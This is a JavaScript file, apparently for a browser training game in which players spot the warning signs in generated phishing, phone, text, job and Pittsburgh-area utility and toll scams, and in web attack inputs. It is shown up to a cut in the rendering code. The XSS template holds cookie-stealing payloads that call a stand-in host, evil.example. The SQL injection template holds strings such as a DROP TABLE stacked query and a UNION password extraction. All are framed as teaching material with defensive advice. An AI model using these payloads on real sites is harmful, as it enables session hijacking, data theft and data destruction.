'use strict';
 
// ---------- small helpers ----------
const rnd = n => Math.floor(Math.random() * n);
const pick = a => a[rnd(a.length)];
const int = (a, b) => a + rnd(b - a + 1);
const digits = n => { let s = String(int(1, 9)); for (let i = 1; i < n; i++) s += int(0, 9); return s; };
const money = (a, b) => '$' + int(a, b).toLocaleString('en-US');
 
// Difficulty: higher levels hide the obvious clues and add subtle ones.
let MAXTIER = 1;
const P = t => ({ t });
const C = (t, type, why) => ({ t, c: { type, why } });
const S = (tier, clue, plain) => (MAXTIER >= tier ? clue : (plain || null));   // subtle clue appears at higher tiers
const E = (maxTier, clue, plain) => (MAXTIER <= maxTier ? clue : (plain || null)); // obvious clue fades at higher tiers
const flat = arr => []
  .concat(arr)
  .flat(Infinity)
  .filter(Boolean)
  .map(x => (typeof x === 'string' ? P(x) : x));
 
// ---------- fictional data pools ----------
const NAMES = ['Alex', 'Jordan', 'Priya', 'Daniel', 'Maria', 'Chen', 'Fatima', 'Omar', 'Sofia', 'Liam'];
const SURNAMES = ['Whitmore', 'Okafor', 'Tanaka', 'Reyes', 'Novak', 'Haddad', 'Lindqvist', 'Brooks'];
const CITIES = ['Singapore', 'Frankfurt', 'Sao Paulo', 'Dallas', 'Manchester', 'Mumbai', 'Toronto', 'Warsaw'];
const BANKS = [
  { n: 'Northbridge Bank', d: 'northbridgebank.com', s: 'Northbridge' },
  { n: 'Meridian Credit Union', d: 'meridiancu.org', s: 'Meridian' },
  { n: 'Harborline Bank', d: 'harborline.com', s: 'Harborline' },
  { n: 'Summit Federal Bank', d: 'summitfederal.com', s: 'Summit Federal' },
];
const COURIERS = [
  { n: 'SwiftParcel', d: 'swiftparcel.com' },
  { n: 'ParcelPoint', d: 'parcelpoint.com' },
  { n: 'TransGo Express', d: 'transgoexpress.com' },
];
const TECHS = [
  { n: 'CloudVault', d: 'cloudvault.com' },
  { n: 'MailNest', d: 'mailnest.com' },
  { n: 'StreamBox', d: 'streambox.com' },
];
const COMPANIES = [
  { n: 'Brightwave Solutions', d: 'brightwavesolutions.com' },
  { n: 'Orion Logistics', d: 'orionlogistics.com' },
  { n: 'Pinecrest Analytics', d: 'pinecrestanalytics.com' },
  { n: 'Vantage Retail Group', d: 'vantageretail.com' },
];
 
// Builds a lookalike domain. Obvious at low levels, subtle (one swapped character) at high levels.
function fakeUrl(dom, path) {
  const parts = dom.split('.');
  const base = parts[0];
  const tld = parts.slice(1).join('.');
  path = path || '';
 
  const swaps = [['i', 'l'], ['m', 'rn'], ['o', '0'], ['l', '1']].filter(s => base.includes(s[0]));
  if (MAXTIER >= 3 && swaps.length && Math.random() < 0.7) {
    const s = pick(swaps);
    const host = base.replace(s[0], s[1]) + '.' + tld;
    return { host, url: 'https://' + host + path, why: 'One character is swapped ("' + s[0] + '" became "' + s[1] + '") to imitate ' + dom + '. Read domains letter by letter.' };
  }
  const kind = rnd(3);
  if (kind === 0) {
    const host = base + '-secure-login.' + pick(['com', 'net', 'info']);
    return { host, url: 'https://' + host + path, why: 'The brand name is padded with extra words. The real site is ' + dom + '.' };
  }
  if (kind === 1) {
    const tail = pick(['account-verify.net', 'secure-check.info', 'id-review.co']);
    const host = dom + '.' + tail;
    return { host, url: 'https://' + host + path, why: 'The real domain is whatever sits just before the final extension (' + tail + '), not the brand name at the start.' };
  }
  const host = base + '.' + pick(['support', 'help', 'online', 'site']);
  return { host, url: 'https://' + host + path, why: 'Unusual extension. The real site ends in .' + tld + '.' };
}
 
// ---------- case templates ----------
function tPhishing() {
  const b = pick(BANKS), f = fakeUrl(b.d, '/secure/verify'), first = pick(NAMES), city = pick(CITIES), mins = pick([10, 15, 20, 30]);
  return {
    channel: 'email', title: 'Account security email',
    meta: [
      { k: 'From', parts: [b.n + ' Security ', C('<alerts@' + f.host + '>', 'Spoofed sender', 'The sender domain is not the bank\'s real domain. ' + f.why)] },
      { k: 'To', parts: [first.toLowerCase() + '.' + pick(SURNAMES).toLowerCase() + '@mailbox.example'] },
      { k: 'Subject', parts: [E(2, C('ACTION REQUIRED: Account will be limited', 'Urgency / deadline', 'Capital letters and a threat of limits are used to rush you.'), 'Security alert for your ' + b.s + ' account')] },
    ],
    body: [{ parts: [
      E(2, C('Dear Customer,', 'Generic greeting', 'The sender does not know your name. A bank that holds your account does.'), 'Hello ' + first + ','), '\n\n',
      'We detected a sign-in to your ' + b.s + ' online banking account from a new device in ' + city + '. ',
      C('Your account will be locked in ' + mins + ' minutes', 'Urgency / deadline', 'A manufactured emergency. Real banks do not lock accounts on a countdown.'),
      ' unless you confirm your identity.\n\n',
      'Verify your account here: ', C(f.url, 'Suspicious link', f.why), '\n\n',
      C('You will be asked for your online banking password and the one-time code we text you.', 'Sensitive data request', 'No legitimate bank asks for passwords or one-time codes through an emailed link.'),
      S(2, [' ', C('Unverified accounts are charged a ' + money(25, 75) + ' reactivation fee.', 'Threat', 'An invented penalty added to raise the pressure.')]),
      '\n\nThank you for banking with us,\n',
      S(3, C(b.s + ' Securty Team', 'Odd wording / typo', 'Professional teams proofread. A misspelt organisation name is a quiet warning sign.'), b.s + ' Security Team'),
      S(2, ['\n', C('Do not reply to this email or call us. Use the secure link above.', 'Secrecy / isolation', 'Scammers steer you away from independent checks such as calling the bank.')]),
    ] }],
    oob: { head: 'Verify instead', text: 'Open the ' + b.n + ' app or type ' + b.d + ' yourself, or call the number on the back of your card. Never use the link or number in the message.' },
  };
}
 
function tInvoice() {
  const co = pick(COMPANIES), f = fakeUrl(co.d), num = digits(5), amt = money(480, 3900);
  const att = MAXTIER <= 2
    ? { name: 'Invoice_' + num + '.pdf.exe', why: 'A double extension hides an executable program behind a fake PDF name.' }
    : pick([
      { name: 'Invoice_' + num + '.docm', why: '.docm files can contain macros, a common way to run malware.' },
      { name: 'Remittance_' + num + '.html', why: 'An HTML attachment can open a fake login page straight from your device.' },
    ]);
  return {
    channel: 'email', title: 'Overdue invoice email',
    meta: [
      { k: 'From', parts: ['Accounts Receivable ', C('<billing@' + f.host + '>', 'Spoofed sender', 'The domain imitates ' + co.d + '. ' + f.why)] },
      S(3, { k: 'Reply-To', parts: [C('<collections@mail-' + digits(3) + '.example>', 'Spoofed sender', 'Replies go to an unrelated domain, not the company that appears to be writing.')] }),
      { k: 'Subject', parts: [E(2, C('FINAL NOTICE: Invoice #' + num + ' overdue', 'Urgency / deadline', 'A "final notice" for an invoice you do not recognise is meant to make you open the file in a panic.'), 'Invoice #' + num + ' - payment reminder')] },
      { k: 'Attached', parts: [C(att.name, 'Malicious attachment', att.why)] },
    ],
    body: [{ parts: [
      'Hello,\n\nOur records show invoice #' + num + ' for ' + amt + ' is 14 days overdue. ',
      C('A 5% late fee applies from tomorrow.', 'Urgency / deadline', 'A tight, invented deadline discourages you from checking the invoice is real.'),
      '\n\nPlease see the attachment and ',
      C('enable editing and content to view the full details', 'Malicious attachment', 'Asking you to enable macros or content is how the malware gets permission to run.'),
      '.',
      S(2, ['\n\n', C('If this is not paid today the account will be passed to collections.', 'Threat', 'A threat of collections adds fear on top of the deadline.')]),
      '\n\nRegards,\nAccounts Receivable',
    ] }],
    oob: { head: 'Verify instead', text: 'Do not open the attachment. Look up the supplier in your own records and call the phone number you already have for them.' },
  };
}
 
function tSmishing() {
  const d = pick(COURIERS), f = fakeUrl(d.d, '/redeliver/' + digits(6)), hrs = pick([12, 24, 48]);
  return {
    channel: 'sms', title: 'Delivery text message',
    meta: [{ k: 'From', parts: [E(2, C('+1 (' + digits(3) + ') ' + digits(3) + '-' + digits(4), 'Spoofed sender', 'Couriers send notices from branded IDs or short codes, not a random personal number.'), d.n)] }],
    body: [
      { parts: [d.n + ': Your parcel SP' + digits(8) + ' could not be delivered because the address is incomplete. ',
        C('Pay a $1.99 redelivery fee within ' + hrs + ' hours', 'Payment demand', 'A tiny fee is a hook to capture your card details. Couriers do not collect fees by text.'),
        ' or it will be returned to the sender.'] },
      { parts: ['Update your address here: ', C(f.url, 'Suspicious link', f.why),
        S(2, [' ', C('Reply Y to activate the link.', 'Unofficial channel', 'Asking for a reply first is a trick that makes the link tappable on some phones and avoids spam filters.')])] },
      { parts: [C('FINAL NOTICE: parcel will be destroyed in 6 hours.', 'Urgency / deadline', 'A second, harsher deadline to keep you from thinking.')] },
    ],
    oob: { head: 'Verify instead', text: 'Open the courier\'s official app or type ' + d.d + ' yourself and enter the tracking number. Ignore links in the text.' },
  };
}
 
function tVishing() {
  const b = pick(BANKS), who = pick(NAMES) + ' ' + pick(SURNAMES);
  return {
    channel: 'call', title: 'Incoming phone call',
    meta: [{ k: 'Caller ID', parts: [C(b.n + ' Fraud Dept', 'Spoofed sender', 'Caller ID can be faked, so a matching name or number proves nothing.')] }],
    body: [
      { kind: 'note', who: 'SCENE', parts: ['Your phone rings unexpectedly. You answer.'] },
      { who: 'CALLER', parts: ['Hello, this is ' + who + ' from the ' + b.n + ' ',
        C('fraud prevention department', 'Authority impersonation', 'Scammers claim to be the fraud team because it sounds both official and urgent.'),
        '. We have flagged ',
        C('a transfer of ' + money(900, 4800) + ' to an overseas account', 'Threat', 'A frightening, specific transaction creates panic before you can think.'),
        ' on your account.'] },
      { who: 'CALLER', parts: [C('I can stop it right now, but you need to act quickly.', 'Urgency / deadline', 'The call is built around a ticking clock so you will not hang up and check.')] },
      { who: 'CALLER', parts: ['To confirm it is really you, ',
        C('I am sending a six-digit code to your phone. Please read it back to me.', 'Sensitive data request', 'That code lets the caller approve the transfer themselves. Never read out one-time codes.')] },
      S(2, { who: 'CALLER', parts: [C('Please stay on the line and do not call the bank. It could alert the fraudster.', 'Secrecy / isolation', 'Keeping you on the line stops you from verifying independently.')] }),
      S(2, { who: 'CALLER', parts: [C('For safety I will move your money to a protected holding account.', 'Payment demand', 'Banks never ask you to move money into a "safe account".')] }),
      S(3, { who: 'CALLER', parts: [C('The number on your screen matches the one on the back of your card.', 'Spoofed sender', 'Scammers spoof caller ID to match the real number. It is not proof.')] }),
    ],
    oob: { head: 'Verify instead', text: 'Hang up. Call the number on the back of your card yourself, wait a minute for a fresh line, and ask whether the bank contacted you.' },
  };
}
 
function tBec() {
  const co = pick(COMPANIES), ceo = pick(NAMES) + ' ' + pick(SURNAMES), f = fakeUrl(co.d);
  const handle = ceo.toLowerCase().replace(' ', '.');
  if (Math.random() < 0.5) {
    const sender = MAXTIER >= 3
      ? C('<' + handle + '@' + f.host + '>', 'Spoofed sender', 'The domain imitates ' + co.d + '. ' + f.why)
      : C('<' + handle + '.ceo@' + pick(['gmail.com', 'outlook.com']) + '>', 'Spoofed sender', 'An executive writing from a free personal address, not the company domain, is a red flag.');
    return {
      channel: 'email', title: 'Message from the "CEO"',
      meta: [
        { k: 'From', parts: [ceo + ' ', sender] },
        { k: 'Subject', parts: ['Quick favour'] },
      ],
      body: [{ parts: [
        'Are you at your desk? ', C('I am in a meeting and cannot take calls.', 'Secrecy / isolation', 'It removes the easy check of picking up the phone.'),
        '\n\nI need you to buy ', C(int(3, 8) + ' gift cards of ' + money(100, 200) + ' each', 'Unusual payment method', 'Gift cards are untraceable. No real company pays suppliers this way.'),
        ' for a client today. ',
        C('Keep this between us until it is done.', 'Secrecy / isolation', 'Secrecy stops colleagues from raising the alarm.'),
        S(2, ['\n\n', C('Reply with the card numbers and PINs as soon as you have them.', 'Sensitive data request', 'Card numbers and PINs are cash. Nobody legitimate asks for them by email.')]),
        S(2, ['\n', C('I will reimburse you by end of day.', 'Payment demand', 'A promise to pay you back is the bait that makes spending your own money sound reasonable.')]),
        '\n\nThanks,\n' + ceo.split(' ')[0],
      ] }],
      oob: { head: 'Verify instead', text: 'Call the executive on a number from the company directory, not from the email, before buying anything or sharing codes.' },
    };
  }
  const vendor = pick(COMPANIES), num = 'INV-' + digits(4), fv = fakeUrl(vendor.d);
  return {
    channel: 'email', title: 'Vendor banking-details change',
    meta: [
      { k: 'From', parts: [vendor.n + ' Accounts ', C('<accounts@' + fv.host + '>', 'Spoofed sender', 'The domain imitates ' + vendor.d + '. ' + fv.why)] },
      { k: 'Subject', parts: [E(2, C('Updated banking details - pay today', 'Urgency / deadline', 'A same-day payment request on changed bank details is the classic invoice-redirection pattern.'), 'Updated banking details for ' + num)] },
    ],
    body: [{ parts: [
      'Hello,\n\nWe have changed banks. ',
      C('Please send all future payments, including ' + num + ', to the new account below.', 'Payment demand', 'Changing bank details by email is how payments are redirected to fraudsters.'),
      '\n\nAccount name: ' + vendor.n + '\nAccount number: ' + digits(10) + '\nRouting: ' + digits(9) + '\n\n',
      C('Our phone lines are down this week, so please reply by email only.', 'Secrecy / isolation', 'It blocks the verification call that would expose the fraud.'),
      S(2, ['\n\n', C('Payment is due today to avoid a late penalty.', 'Urgency / deadline', 'Time pressure so finance staff skip their normal checks.')]),
      '\n\nKind regards,\nAccounts Team',
    ] }],
    oob: { head: 'Verify instead', text: 'Phone the vendor on a number you already hold on file and confirm the new bank details before releasing any payment.' },
  };
}
 
function tJob() {
  const co = pick(COMPANIES), first = pick(NAMES), handle = pick(['hr', 'jobs', 'career']) + '_' + digits(4);
  return {
    channel: 'chat', title: 'Recruiter chat message',
    meta: [{ k: 'From', parts: [C('+' + digits(2) + ' ' + digits(10), 'Unexpected contact', 'Real recruiters do not cold-message you from an unknown personal number.')] }],
    body: [
      { parts: ['Hi, I am ' + first + ' from ' + co.n + ' HR. ',
        C('We found your resume online and you have been pre-selected.', 'Unexpected contact', 'You never applied. Unsolicited offers are the classic hook.')] },
      { parts: ['The role is remote data entry. ', C('Pay is ' + money(150, 300) + ' per day, no experience or interview needed.', 'Too good to be true', 'High pay for easy work with no interview is a warning sign.')] },
      { parts: ['To secure your place, ', C('pay a refundable ' + money(30, 80) + ' training kit fee', 'Payment demand', 'Legitimate employers never charge you to start work.'), '.'] },
      S(2, { parts: [C('Only ' + int(2, 5) + ' spots left today.', 'Urgency / deadline', 'Artificial scarcity makes you act before researching.')] }),
      S(2, { parts: ['Message me on Telegram to continue: ', C('@' + handle, 'Unofficial channel', 'Moving to a private app takes the conversation away from platforms that detect fraud.')] }),
      S(2, { parts: ['Please also send ', C('a photo of your ID and your bank details for payroll setup', 'Sensitive data request', 'Collecting ID and bank details before a contract enables identity theft.'), '.'] }),
    ],
    oob: { head: 'Verify instead', text: 'Find ' + co.n + ' on its official website and contact HR through the careers page. Ask whether this recruiter exists. Never pay to get a job.' },
  };
}
 
function tTech() {
  const t = pick(TECHS), f = fakeUrl(t.d, '/support/connect'), who = pick(NAMES);
  return {
    channel: 'call', title: 'Tech-support phone call',
    meta: [{ k: 'Caller ID', parts: ['Unknown number'] }],
    body: [
      { kind: 'note', who: 'SCENE', parts: ['A caller says they work for a software company you use.'] },
      { who: 'CALLER', parts: ['Hello, this is ' + who + ' from ' + t.n + ' technical support. ',
        C('Our systems show your computer is sending virus alerts.', 'Unexpected contact', 'Companies do not monitor your device and cold-call you about it.')] },
      { who: 'CALLER', parts: [C('If you turn it off you will lose all your files.', 'Threat', 'An invented danger to stop you from switching the computer off and calling a friend.')] },
      { who: 'CALLER', parts: ['I need you to ', C('install a remote access tool from ' + f.url, 'Suspicious link', f.why), ' so I can fix it.'] },
      { who: 'CALLER', parts: ['There is a one-time cleanup fee. ', C('You can pay it with gift cards.', 'Unusual payment method', 'Gift cards are untraceable. Legitimate support never takes them.')] },
      S(2, { who: 'CALLER', parts: [C('Do not tell your bank. They are part of the problem.', 'Secrecy / isolation', 'It isolates you from the people who could stop the fraud.')] }),
    ],
    oob: { head: 'Verify instead', text: 'Hang up. If you are worried, contact ' + t.n + ' through the support page on ' + t.d + ' typed in yourself. Never give a caller remote access.' },
  };
}
 
function tXss() {
  const name = pick(NAMES) + ' ' + pick(SURNAMES), post = int(100, 999);
  const tier1 = [
    { t: '<script>alert(\'XSS\')</script>', type: 'Script injection', why: 'A script tag typed into a text field. If the page prints it unescaped, the browser runs it.' },
    { t: '<script>document.location=\'http://evil.example/steal?c=\'+document.cookie</script>', type: 'Cookie theft', why: 'Reads document.cookie and sends it to another site, which would let the attacker hijack the session.' },
  ];
  const tier2 = [
    { t: '<img src=x onerror="fetch(\'http://evil.example/c?\'+document.cookie)">', type: 'Event-handler injection', why: 'onerror runs code without any script tag, so a filter that only blocks <script> misses it.' },
    { t: '<a href="javascript:alert(document.domain)">free gift</a>', type: 'javascript: URL', why: 'A javascript: link runs code when clicked instead of opening a page.' },
  ];
  const tier3 = [
    { t: '%3Cscript%3Ealert(1)%3C%2Fscript%3E', type: 'Encoded payload', why: 'A URL-encoded script tag. Filters that look for the literal text miss it, and decoding restores it.' },
    { t: '"><svg onload=alert(1)>', type: 'Attribute breakout', why: 'The leading quote and > try to break out of an HTML attribute and add a new element.' },
    { t: '&#x3C;img src=x onerror=alert(1)&#x3E;', type: 'Encoded payload', why: 'HTML entities hide the angle brackets from a naive filter.' },
  ];
  const chosen = MAXTIER === 1 ? [tier1[0], tier1[1]]
    : MAXTIER === 2 ? [pick(tier1), pick(tier2)]
      : [pick(tier2), pick(tier3), pick(tier3)];
  const uniq = chosen.filter((x, i) => chosen.findIndex(y => y.t === x.t) === i);
  const parts = ['Great article, really helpful! '];
  uniq.forEach((x, i) => { parts.push(C(x.t, x.type, x.why)); parts.push(i < uniq.length - 1 ? ' Also worth reading: ' : ''); });
  parts.push(' Thanks for sharing.');
  return {
    channel: 'web', title: 'Comment form submission',
    meta: [
      { k: 'Request', parts: ['POST /blog/post/' + post + '/comments'] },
      { k: 'Name', parts: [name] },
      { k: 'Website', parts: [C('javascript:fetch(\'//evil.example/?\'+document.cookie)', 'javascript: URL', 'A javascript: URL in a link field runs code when someone clicks the commenter\'s name.')] },
    ],
    body: [{ kind: 'field', k: 'Comment', parts }],
    oob: { head: 'Defend with', text: 'Escape output so < > and quotes display as text, set a Content-Security-Policy, mark session cookies HttpOnly, and sanitise any HTML you deliberately allow.' },
  };
}
 
function tSqli() {
  const useLogin = Math.random() < 0.6;
  const t1 = [
    { t: 'admin\'--', type: 'Comment terminator', why: '"--" comments out the rest of the SQL query, including the password check.' },
    { t: '\' OR \'1\'=\'1', type: 'Always-true condition', why: 'Makes the WHERE clause true for every row, so the login succeeds without a password.' },
  ];
  const t2 = [
    { t: '\'; DROP TABLE users;--', type: 'Stacked query', why: 'The semicolon ends the first statement and starts a destructive second one.' },
    { t: '\' UNION SELECT username, password FROM users--', type: 'UNION extraction', why: 'UNION SELECT appends another query to pull data from a different table.' },
  ];
  const t3 = [
    { t: '1\' AND SLEEP(5)--', type: 'Time-based probe', why: 'If the page pauses five seconds, the attacker knows the input reaches the database.' },
    { t: '\' AND 1=CONVERT(int,(SELECT @@version))--', type: 'Error-based probe', why: 'Forces an error that leaks the database version in the response.' },
    { t: '\' OR 1=1 LIMIT 1 OFFSET 0 /*', type: 'Always-true condition', why: 'A quieter always-true test that ends with a comment opener.' },
  ];
  const a = MAXTIER === 1 ? pick(t1) : MAXTIER === 2 ? pick(t2) : pick(t3);
  const b = MAXTIER === 1 ? t1.find(x => x !== a) : MAXTIER === 2 ? pick(t1) : pick(t2);
  if (useLogin) {
    return {
      channel: 'web', title: 'Login request log',
      meta: [
        { k: 'Request', parts: ['POST /login'] },
        { k: 'Server query', parts: ['SELECT * FROM users WHERE username = \'<username>\' AND password = \'<password>\''] },
        { k: 'username', parts: [C(a.t, a.type, a.why)] },
        { k: 'password', parts: [C(b.t, b.type, b.why)] },
      ],
      body: [
        { kind: 'field', k: 'Response', parts: [C('200 OK - session created for user id 1', 'Login bypass result', 'Success with a nonsense password shows the injected condition changed the query.')] },
        S(2, { kind: 'field', k: 'Server log', parts: ['Query executed in ', C('5003 ms', 'Time-based probe', 'An unusually long response time on a simple login suggests an injected delay.'), ' (normal: 12 ms)'] }),
      ],
      oob: { head: 'Defend with', text: 'Use parameterised queries or prepared statements, validate input, give the database account least privilege, and never expose raw database errors.' },
    };
  }
  return {
    channel: 'web', title: 'Search request log',
    meta: [
      { k: 'Request', parts: ['GET /search?q=<term>&id=<id>'] },
      { k: 'Server query', parts: ['SELECT name, price FROM products WHERE name LIKE \'%<term>%\' AND id = <id>'] },
      { k: 'q', parts: [C(a.t, a.type, a.why)] },
      { k: 'id', parts: [C(b.t, b.type, b.why)] },
    ],
    body: [
      { kind: 'field', k: 'Response', parts: ['200 OK - ', C(int(40, 900) + ' rows returned instead of the usual 1-5', 'Always-true condition', 'A huge result set from one search term shows the filter was bypassed.')] },
    ],
    oob: { head: 'Defend with', text: 'Use parameterised queries or prepared statements, validate input, give the database account least privilege, and never expose raw database errors.' },
  };
}
 
// ---------- local (Pittsburgh area) templates ----------
function tDuquesne() {
  const f = fakeUrl('duquesnelight.com', '/pay/' + digits(6));
  const amt = money(142, 489), hrs = pick([1, 2]), area = pick(['412', '724', '878']), acct = digits(4);
  const oob = { head: 'Verify instead', text: 'Check your latest Duquesne Light bill, or log in at duquesnelight.com typed in by you, and use the phone number printed on the bill. A real balance will show in your account. Never pay a stranger who contacted you first.' };
  if (Math.random() < 0.5) {
    return {
      channel: 'sms', title: 'Duquesne Light billing text',
      meta: [{ k: 'From', parts: [C('+1 (' + area + ') ' + digits(3) + '-' + digits(4), 'Spoofed sender', 'Utilities send alerts from a registered short code or the number on your bill, not a personal-looking mobile number.')] }],
      body: [
        { parts: ['Duquesne Light: Your account ending in ' + acct + ' is past due. ',
          C('Service will be disconnected today at 5:00 PM', 'Threat', 'Utilities send formal written notice before a shutoff and give you time to respond. A same-day text threat is a classic scam.'), '.'] },
        { parts: ['Pay ' + amt + ' within ' + hrs + (hrs === 1 ? ' hour' : ' hours') + ' ',
          C('to avoid a $50 reconnection fee', 'Urgency / deadline', 'An invented fee and a tight deadline push you to pay before you check.'), '. Pay here: ',
          C(f.url, 'Suspicious link', f.why)] },
        S(2, { parts: [C('Prepaid card, Zelle or gift card accepted for instant credit.', 'Unusual payment method', 'Utilities do not ask for gift cards, prepaid cards or Zelle payments to an individual.')] }),
        S(3, { parts: [C('Reply with the last 4 digits of your SSN to confirm your identity.', 'Sensitive data request', 'No utility needs your Social Security digits to take a payment.')] }),
      ],
      oob,
    };
  }
  const who = pick(NAMES) + ' ' + pick(SURNAMES);
  return {
    channel: 'call', title: 'Utility shutoff phone call',
    meta: [{ k: 'Caller ID', parts: [C('Duquesne Light Customer Care', 'Spoofed sender', 'Caller ID can be faked, so a matching name proves nothing.')] }],
    body: [
      { kind: 'note', who: 'SCENE', parts: ['A call comes in while you are at home.'] },
      { who: 'CALLER', parts: ['Hello, this is ' + who + ' from the Duquesne Light billing department. Your account ending in ' + acct + ' is 60 days past due.'] },
      { who: 'CALLER', parts: [C('Your power will be shut off within ' + hrs + (hrs === 1 ? ' hour' : ' hours') + ' unless you pay ' + amt + ' right now.', 'Threat', 'A same-day shutoff threat by phone is a hallmark of utility scams.')] },
      { who: 'CALLER', parts: ['The fastest way is ', C('a Bitcoin ATM deposit or a prepaid cash card', 'Unusual payment method', 'No utility asks you to pay through a crypto ATM or a prepaid card.'), '. I will stay on the line and guide you.'] },
      S(2, { who: 'CALLER', parts: [C('Our online payment system is down today, so you cannot pay on the website or at the office.', 'Secrecy / isolation', 'It blocks the independent check that would expose the scam.')] }),
      S(2, { who: 'CALLER', parts: [C('Do not hang up or your account will be flagged for disconnection.', 'Secrecy / isolation', 'Keeping you on the line stops you from calling the number on your bill.')] }),
    ],
    oob,
  };
}
 
function tTurnpike() {
  const f = fakeUrl('paturnpike.com', '/ezpay/' + digits(6));
  const bal = '$' + int(3, 12) + '.' + pick(['10', '40', '65', '85']), fee = int(35, 60), area = pick(['412', '724', '717', '878']);
  return {
    channel: 'sms', title: 'PA Turnpike E-ZPass toll text',
    meta: [{ k: 'From', parts: [C('+1 (' + area + ') ' + digits(3) + '-' + digits(4), 'Spoofed sender',
          'Real toll notices arrive by mail or inside your E-ZPass account, not from a random mobile number.')] }],
    body: [
      { parts: ['PA Turnpike E-ZPass: Our records show an unpaid toll balance of ' + bal + '. ',
        C('Pay within 12 hours to avoid a $' + fee + ' late fee.', 'Urgency / deadline',
            'A small balance is paired with a big penalty and a short deadline to rush you.')] },
      { parts: ['Settle your balance here: ', C(f.url, 'Suspicious link', f.why)] },
      S(2, { parts: [C('Reply Y, then reopen this message to activate the link.',
            'Unofficial channel', 'Asking for a reply first is a trick that makes the link tappable and avoids spam filters.')] }),
      S(2, { parts: [C('Your vehicle registration may be suspended and the debt sent to collections.',
            'Threat', 'Real toll violations come with mailed notices and appeal rights before any registration action.')] }),
      S(3, { parts: [C('Enter your card number to clear the balance instantly.',
            'Sensitive data request', 'A legitimate toll payment goes through your own E-ZPass account, not a link in an unsolicited text.')] }),
    ],
    oob: { head: 'Verify instead', text: 'Log in to your E-ZPass account on the official PA Turnpike site, typed in by you, or check your mailed statement. ' +
          'If you have no recent toll trips, ignore the text and report it.' },
  };
}
 
const TYPES = {
  phishing: { label: 'Phishing email', group: 'Social engineering', gen: tPhishing },
  invoice: { label: 'Malicious attachment email', group: 'Social engineering', gen: tInvoice },
  smishing: { label: 'Smishing (text message)', group: 'Social engineering', gen: tSmishing },
  vishing: { label: 'Vishing (bank phone call)', group: 'Social engineering', gen: tVishing },
  bec: { label: 'Business email compromise', group: 'Social engineering', gen: tBec },
  job: { label: 'Fake job offer', group: 'Social engineering', gen: tJob },
  tech: { label: 'Tech-support phone call', group: 'Social engineering', gen: tTech },
  xss: { label: 'XSS injection', group: 'Web attacks', gen: tXss },
  sqli: { label: 'SQL injection', group: 'Web attacks', gen: tSqli },
  duquesne: { label: 'Duquesne Light billing scam', group: 'Local to Pittsburgh', gen: tDuquesne },
  ezpass: { label: 'PA Turnpike E-ZPass toll text', group: 'Local to Pittsburgh', gen: tTurnpike },
};
 
// ---------- levels ----------
const TITLES = ['Rookie',
  'Analyst',
  'Investigator',
  'Senior Investigator',
  'Detective', 'Senior Detective',
  'Chief Inspector',
  'Cyber Legend'];
const need = l => 100 + 25 * (l - 1);
function levelInfo(xp) {
  let l = 1, rem = Math.max(0, xp);
  while (rem >= need(l)) { rem -= need(l); l++; }
  return { level: l, into: rem, need: need(l), title: TITLES[Math.min(l, TITLES.length) - 1] };
}
const tierFor = level => (level <= 2 ? 1 : level <= 4 ? 2 : 3);
 
// ---------- case generation ----------
function finalize(msg) {
  let id = 0;
  msg.clues = [];
  msg.byId = {};
  msg.meta = msg.meta.filter(Boolean);
  const walk = rows => rows.forEach(r => {
    r.parts = flat(r.parts);
    r.parts.forEach(p => {
      p.id = id++;
      if (p.c && r.kind !== 'note') {
        const clue = { id: p.id, type: p.c.type, why: p.c.why, text: p.t.trim() };
        msg.clues.push(clue);
        msg.byId[p.id] = clue;
      }
    });
  });
  msg.body = msg.body.filter(Boolean);
  walk(msg.meta);
  walk(msg.body);
  return msg;
}
 
function generate(typeKey, level) {
  MAXTIER = tierFor(level || 1);
  let key = typeKey;
  if (!key || key === 'any' || !TYPES[key]) key = pick(Object.keys(TYPES));
  let msg;
  for (let tries = 0; tries < 6; tries++) {
    msg = finalize(TYPES[key].gen());
    if (msg.clues.length >= 3) break;
  }
  msg.typeKey = key;
  msg.typeLabel = TYPES[key].label;
  return msg;
}
 
// ---------- game UI ----------
const STORE = 'cernoscam_detective_v1';
function loadProg() {
  try { const raw = localStorage.getItem(STORE); if (raw) return Object.assign({ xp: 0, cases: 0, streak: 0 }, JSON.parse(raw)); } catch (e) { /* storage may be blocked */ }
  return { xp: 0, cases: 0, streak: 0 };
}
function saveProg() { try { localStorage.setItem(STORE, JSON.stringify(prog)); } catch (e) { /* ignore */ } }
 
let prog = { xp: 0, cases: 0, streak: 0 };
let cur = null;
let caseNo = 0;
const $ = id => document.getElementById(id);
 
function initTypeSelect() {
  const sel = $('typeSel');
  sel.innerHTML = '';
  const any = document.createElement('option');
  any.value = 'any'; any.textContent = 'Random mix';
  sel.appendChild(any);
  ['Social engineering', 'Web attacks', 'Local to Pittsburgh'].forEach(g => {
    const og = document.createElement('optgroup');
    og.label = g;
    Object.keys(TYPES).filter(k => TYPES[k].group === g).forEach(k => {
      const o = document.createElement('option');
      o.value = k; o.textContent = TYPES[k].label;
      og.appendChild(o);
    });
    sel.appendChild(og);
  });
}
 
function updateHud() {
  const li = levelInfo(prog.xp);
  $('rank').textContent = li.title;
  $('lvl').textContent = li.level;
  $('xpFill').style.width = Math.round((li.into / li.need) * 100) + '%';
  $('xpText').textContent = li.into + ' / ' + li.need + ' XP';
  $('cases').textContent = prog.cases;
  $('streak').textContent = prog.streak;
  if (cur) {
    $('found').textContent = cur.found.size;
    $('total').textContent = cur.msg.clues.length;
    $('wrongN').textContent = cur.wrong.size;
  }
}
 
function mkSeg(p, rowKind) {
  const s = document.createElement('span');
  s.textContent = p.t;
  if (rowKind === 'note') { s.className = 'note-text'; return s; }
  s.className = 'seg';
  s.dataset.id = p.id;
  s.tabIndex = 0;
  s.setAttribute('role', 'button');
  return s;
}
 
function renderCase() {
  const m = cur.msg;
  $('caseNo').textContent = 'Case #' + String(caseNo).padStart(4, '0');
  const badge = { email: 'EMAIL', sms: 'SMS', chat: 'CHAT', call: 'PHONE CALL', web: 'WEB INPUT' }[m.channel];
  $('channel').textContent = badge;
  $('caseTitle').textContent = m.title;
  const box = $('msg');
  box.className = 'msg ch-' + m.channel;
  box.innerHTML = '';
 
  const hdr = document.createElement('div');
  hdr.className = 'hdr';
  m.meta.forEach(r => {
    const row = document.createElement('div');
    row.className = 'row';
    const k = document.createElement('span'); k.className = 'k'; k.textContent = r.k;
    const v = document.createElement('span'); v.className = 'v';
    r.parts.forEach(p => v.appendChild(mkSeg(p)));
    row.appendChild(k); row.appendChild(v); hdr.appendChild(row);
  });
  box.appendChild(hdr);
 
  const body = document.createElement('div');
  body.className = 'body';
  m.body.forEach(r => {
    const el = document.createElement('div');
